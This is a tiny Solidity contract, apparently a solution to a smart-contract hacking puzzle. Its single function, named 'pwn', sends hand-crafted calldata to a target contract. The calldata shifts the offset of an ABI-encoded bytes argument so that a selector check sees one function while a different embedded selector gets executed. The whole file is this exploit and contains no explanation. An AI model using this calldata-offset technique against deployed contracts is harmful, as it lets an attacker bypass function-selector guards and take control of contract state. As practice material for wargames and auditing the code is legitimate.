// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Flip {
    function pwn(address target) external {
        target.call(abi.encodeWithSelector(0x30c13ade, uint256(0x60), uint256(0), bytes4(0x20606e15), uint256(4), bytes4(0x76227e12)));
    }
}
